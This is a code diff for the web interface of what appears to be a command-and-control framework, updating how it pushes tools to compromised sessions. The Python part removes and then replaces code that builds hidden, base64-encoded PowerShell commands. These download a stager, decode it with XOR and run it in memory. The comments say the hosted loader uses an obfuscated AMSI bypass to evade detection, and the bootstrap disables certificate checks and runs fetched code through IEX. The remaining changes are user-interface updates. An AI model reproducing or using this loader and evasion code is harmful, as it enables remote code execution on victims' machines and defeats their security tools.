@@ -230,34 +230,9 @@ def _api_arsenal_tools() -> dict:
         })
     return {"tools": tools}
 
-def _gen_tool_ps1(enc_name: str, clr: bool, params: str) -> str:
-    import base64 as _b64
-    url  = f"{_srv()._SERVER_BASE}/{enc_name}"
-    # Decode pack_enc: base64(k1 | XOR(k2 | XOR(payload, k2), k1))
-    dec  = (
-        f"$r=(New-Object Net.WebClient).DownloadData('{url}');"
-        f"$t=[Convert]::FromBase64String([Text.Encoding]::ASCII.GetString($r));"
-        f"$k1=$t[0];$m=New-Object byte[]($t.Length-1);"
-        f"for($i=1;$i-lt$t.Length;$i++){{$m[$i-1]=$t[$i]-bxor$k1}};"
-        f"$k2=$m[0];$p=New-Object byte[]($m.Length-1);"
-        f"for($i=1;$i-lt$m.Length;$i++){{$p[$i-1]=$m[$i]-bxor$k2}};"
-    )
-    if clr:
-        if params.strip():
-            arr = ",".join(f"'{a}'" for a in params.split())
-            exec_part = f"[Reflection.Assembly]::Load($p).EntryPoint.Invoke($null,@([string[]]@({arr})))"
-        else:
-            exec_part = "[Reflection.Assembly]::Load($p).EntryPoint.Invoke($null,$null)"
-    else:
-        exec_part = (
-            "$h=[Runtime.InteropServices.GCHandle]::Alloc($p,3);"
-            "([Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($h.AddrOfPinnedObject(),[Action]))()"
-        )
-    ps1 = dec + exec_part
-    b64 = _b64.b64encode(ps1.encode("utf-16-le")).decode()
-    return f"powershell -nop -w hidden -enc {b64}"
-
 def _api_arsenal_run(body: bytes) -> tuple:
+    import base64 as _b64
+    from builders.stager import build_tool_stager
     try:
         req = json.loads(body or b"{}")
     except Exception:
@@ -275,10 +250,46 @@ def _api_arsenal_run(body: bytes) -> tuple:
     clr  = meta.get("clr", False)
     if params is None:
         params = meta.get("args", "")
-    cmd     = _gen_tool_ps1(enc_name, clr, params or "")
+
+    # Build stager PS1 and host it in workspace — same technique as initial access
+    import secrets as _sec
+    from builders.stager import _compact_exec_loader
+    tool_url    = f"{_srv()._SERVER_BASE}/{enc_name}"
+    ps1         = build_tool_stager(tool_url, clr, params or None)
+    stager_name = f"_st_{_sec.token_hex(8)}.ps1"
+    stager_path = os.path.join(_workspace, stager_name)
+    with open(stager_path, "w", encoding="utf-8") as f:
+        f.write(ps1)
+    stager_url  = f"{_srv()._SERVER_BASE}/{stager_name}"
+
+    # Host the compact loader as a separate PS1 file — the compact loader has ZWSP-obfuscated
+    # AMSI bypass, so AMSI won't detect it when downloaded. The bootstrap is kept tiny (<400 chars
+    # b64) to fit inside the agent's ~4KB command buffer; the full compact loader is hosted here.
+    loader_lines = _compact_exec_loader(stager_url)
+    loader_name  = f"_ld_{_sec.token_hex(8)}.ps1"
+    loader_path  = os.path.join(_workspace, loader_name)
+    with open(loader_path, "w", encoding="utf-8") as f:
+        f.write("\n".join(loader_lines))
+    loader_url = f"{_srv()._SERVER_BASE}/{loader_name}"
+
+    # Bootstrap: explicit UTF-8 WebClient so ZWSP chars in the compact loader survive
+    # DownloadString (default WebClient uses system OEM codepage, corrupting Unicode).
+    # The compact loader then bypasses AMSI and fetches+invokes the stager in-memory.
+    short_boot = (
+        f"[Net.ServicePointManager]::ServerCertificateValidationCallback={{$true}};"
+        f"$__wc=New-Object Net.WebClient;"
+        f"$__wc.Encoding=[Text.Encoding]::UTF8;"
+        f"IEX($__wc.DownloadString('{loader_url}'))"
+    )
+    b64 = _b64.b64encode(short_boot.encode("utf-16-le")).decode()
+    cmd = f"powershell -NonInteractive -WindowStyle Hidden -enc {b64}"
+
     task_id = _srv()._c2_push_task(sid, cmd)
     if task_id is None:
+        os.unlink(stager_path)
+        os.unlink(loader_path)
         return _j({"error": "session not found"}, 404)
+
     _srv()._sse_publish({
         "type": "task_queued", "task_id": task_id, "session_id": sid,
         "cmd": f"[TOOL] {tool_name} {params or ''}".strip(),
@@ -486,6 +497,12 @@ def handle_ui_request(method: str, path: str, body: bytes, db) -> tuple:
         m = re.fullmatch(r"/ui/api/c2/([^/]+)", path)
         if m:
             return _api_c2_kill(m.group(1))
+        m = re.fullmatch(r"/ui/api/sessions/([^/]+)", path)
+        if m:
+            sid = m.group(1)
+            if db:
+                db.delete_session(sid)
+            return _j({"deleted": sid})
 
     return 404, "application/json", b'{"error":"not found"}'
 
@@ -583,6 +600,9 @@ html,body { height:100%; background:var(--bg); color:var(--text); font:12px/1.5 
 .sess-item-id { font-size:10px; color:var(--dim2); margin-bottom:2px; }
 .sess-item-host { font-size:11px; color:var(--text); }
 .sess-item-meta { display:flex; align-items:center; gap:6px; margin-top:3px; }
+.sess-del { margin-left:auto; background:none; border:none; color:var(--dim); cursor:pointer;
+            font-size:13px; line-height:1; padding:0 2px; }
+.sess-del:hover { color:var(--red2); }
 .sess-empty { padding:16px 12px; font-size:11px; color:var(--dim); text-align:center; }
 
 /* ── main panel ── */
@@ -994,8 +1014,13 @@ input[type=text]:focus { outline:none; border-color:var(--red); }
         <!-- Tools pane -->
         <div id="ars-tools" style="display:none;padding:0">
           <div style="padding:8px 16px;font-size:10px;color:var(--dim);border-bottom:1px solid var(--border);
-                      display:flex;align-items:center;gap:8px">
-            <span id="ars-sess-hint" style="color:var(--amber)">— select a session to enable Run</span>
+                      display:flex;align-items:center;gap:8px;flex-wrap:wrap">
+            <span style="color:var(--dim2)">TARGET SESSION:</span>
+            <select id="ars-sess-sel" onchange="onArsSessChange()" style="
+                background:var(--surf2);color:var(--fg);border:1px solid var(--border);
+                padding:2px 6px;font-size:10px;font-family:inherit;cursor:pointer;flex:1;min-width:160px">
+              <option value="">— select session —</option>
+            </select>
           </div>
           <div id="arsenal-tools-body" style="overflow-y:auto"></div>
         </div>
@@ -1134,6 +1159,7 @@ let sessDetail   = {};   // {session, tasks, events} for selectedSid
 let shellHist    = [];
 let histIdx      = -1;
 let pendingPolls = {};   // task_id → intervalId
+let pendingEls   = {};   // task_id → pending DOM element
 let curTab       = 'shell';
 let curGV        = 'ops';
 
@@ -1170,25 +1196,40 @@ function handleSSE(ev) {
     case 'session_new':
       liveSessions[ev.id] = {host: ev.host, stale: false, last_seen: ev.ts, pending: 0};
       renderSessList();
+      updateArsSessSelect();
       break;
     case 'session_killed':
       delete liveSessions[ev.id];
       if (selectedSid === ev.id) deselectSession();
       renderSessList();
+      updateArsSessSelect();
       break;
     case 'task_result':
-      // cancel pending poll — fetch result immediately
       if (pendingPolls[ev.task_id]) {
         clearInterval(pendingPolls[ev.task_id]);
         delete pendingPolls[ev.task_id];
-        fetchResult(ev.session_id, ev.task_id, ev.has_creds);
       }
+      fetchResult(ev.session_id, ev.task_id, ev.has_creds);
       if (ev.has_creds && ev.session_id === selectedSid) {
         updateCredsBadge();
       }
       break;
     case 'file_served':
       break;
+    case 'ast_auto_start': {
+      const panel = document.getElementById('astaroth-panel');
+      if (!astOpen) {
+        astOpen = true;
+        panel.classList.add('open');
+        document.getElementById('ast-toggle')?.classList.add('active');
+        updateAstCtx();
+      }
+      astAppend('sys', `⚡ auto [${(ev.task_id||'').slice(0,8)}]`);
+      const autoBubble = astAppend('ai', '');
+      autoBubble.classList.add('ast-streaming');
+      astPending[ev.stream_id] = autoBubble;
+      break;
+    }
     case 'ast_token': {
       const b = astPending[ev.id];
       if (b) {
@@ -1217,6 +1258,7 @@ async function fetchResult(sid, tid, hasCreds) {
     const r = await fetch(`/ui/api/c2/${sid}/result/${tid}`);
     if (r.status === 200) {
       const txt = await r.text();
+      if (pendingEls[tid]) { pendingEls[tid].remove(); delete pendingEls[tid]; }
       if (sid === selectedSid) appendShellResult(tid, txt, hasCreds);
     }
   } catch(_) {}
@@ -1291,6 +1333,7 @@ function renderSessList() {
       <div class="sess-item-meta">
         <span class="dot ${dot}"></span>
         <span class="sess-item-id">${esc(sid.slice(0,14))}</span>
+        <button class="sess-del" title="Remove from history" onclick="event.stopPropagation();dismissSession('${esc(sid)}')">×</button>
       </div>
       <div class="sess-item-host">${esc(host)}</div>
       ${label}
@@ -1604,8 +1647,44 @@ async function killSession() {
   await loadLive();
 }
 
+async function dismissSession(sid) {
+  await fetch('/ui/api/sessions/'+sid, {method:'DELETE'});
+  dbSessions = dbSessions.filter(s => s.id !== sid);
+  if (liveSessions[sid]) delete liveSessions[sid];
+  if (selectedSid === sid) deselectSession();
+  renderSessList();
+  updateArsSessSelect();
+}
+
 // ── Arsenal ────────────────────────────────────────────────────────────────
 let arsTab = 'files';
+let arsSid = '';   // session selected in Arsenal dropdown (independent of selectedSid)
+
+function updateArsSessSelect() {
+  const sel = document.getElementById('ars-sess-sel');
+  if (!sel) return;
+  const cur = arsSid || sel.value;
+  const live = Object.entries(liveSessions).filter(([,v])=>!v.stale);
+  sel.innerHTML = '<option value="">— select session —</option>' +
+    live.map(([sid,v]) => {
+      const db = dbSessions.find(s=>s.id===sid);
+      const label = db?.label ? ` [${db.label}]` : '';
+      const sel_ = cur===sid ? ' selected' : '';
+      return `<option value="${esc(sid)}"${sel_}>${esc(sid.slice(0,14))} ${esc(v.host)}${esc(label)}</option>`;
+    }).join('');
+  arsSid = sel.value;
+  // update tool buttons state
+  document.querySelectorAll('.tool-run').forEach(b => {
+    b.disabled = !arsSid || !b.dataset.built;
+  });
+}
+
+function onArsSessChange() {
+  arsSid = document.getElementById('ars-sess-sel').value;
+  document.querySelectorAll('.tool-run').forEach(b => {
+    b.disabled = !arsSid || !b.dataset.built;
+  });
+}
 
 function setArsTab(tab) {
   arsTab = tab;
@@ -1660,7 +1739,7 @@ async function loadTools() {
         const st  = t.built ? '<span style="color:var(--glow)">✓</span>'
                   : t.binary_found ? '<span style="color:var(--amber)" title="binary found, not encoded">○</span>'
                   : '<span style="color:var(--dim)" title="binary not found">✗</span>';
-        const dis = (!t.built || !selectedSid) ? 'disabled' : '';
+        const dis = !t.built ? 'disabled' : (!arsSid ? 'disabled' : '');
         const hint2 = !t.built
           ? (t.binary_found ? `title="encode first: lilith build --tool ${esc(t.name)}"` : `title="binary not found"`)
           : '';
@@ -1670,17 +1749,19 @@ async function loadTools() {
           <span class="tool-desc">${esc(t.desc)}</span>
           <input class="tool-params" id="tp-${esc(t.name)}" type="text" value="${esc(t.args||t.default_params||'')}"
                  placeholder="params" spellcheck="false">
-          <button class="tool-run" ${dis} ${hint2}
+          <button class="tool-run" ${dis} ${hint2} data-built="${t.built?'1':''}"
                   onclick="runTool('${esc(t.name)}',this)">Run ▸</button>
         </div>`;
       });
     });
     body.innerHTML = html;
+    updateArsSessSelect();
   } catch(e) { body.innerHTML=`<div style="padding:16px;color:var(--red2)">${esc(e.message)}</div>`; }
 }
 
 async function runTool(name, btn) {
-  if (!selectedSid) { alert('Select a session first'); return; }
+  const targetSid = arsSid || selectedSid;
+  if (!targetSid) { alert('Select a session in the dropdown first'); return; }
   const params = document.getElementById('tp-'+name)?.value || '';
   btn.disabled = true;
   btn.textContent = '…';
@@ -1688,7 +1769,7 @@ async function runTool(name, btn) {
     const r = await fetch('/ui/api/arsenal/run', {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({session_id: selectedSid, tool_name: name, params}),
+      body: JSON.stringify({session_id: targetSid, tool_name: name, params}),
     });
     const d = await r.json();
     if (!r.ok) {
@@ -1697,11 +1778,28 @@ async function runTool(name, btn) {
       setTimeout(()=>{ btn.textContent='Run ▸'; btn.style.color=''; btn.disabled=false; }, 2000);
       return;
     }
+    const {task_id} = d;
     btn.textContent = 'Sent ✓';
     btn.classList.add('ok');
-    // switch to ops view and shell tab to watch output
     setGV('ops');
     setTab('shell');
+    // pending line + fallback poll (SSE fires first in normal flow)
+    const pendEl = shellAppend('output', `▸ [TOOL] ${name} …`);
+    pendingEls[task_id] = pendEl;
+    let n = 0;
+    const iv = setInterval(async () => {
+      n++;
+      try {
+        const res = await fetch(`/ui/api/c2/${targetSid}/result/${task_id}`);
+        if (res.status === 200) {
+          clearInterval(iv); delete pendingPolls[task_id]; delete pendingEls[task_id];
+          pendEl.remove();
+          appendShellResult(task_id, await res.text(), false);
+        }
+      } catch(_) {}
+      if (n > 150) { clearInterval(iv); pendEl.textContent = '  [!] timeout'; pendEl.className='sl sl-err'; }
+    }, 2000);
+    pendingPolls[task_id] = iv;
     setTimeout(()=>{ btn.textContent='Run ▸'; btn.classList.remove('ok'); btn.disabled=false; }, 2000);
   } catch(e) {
     btn.textContent = 'ERR';
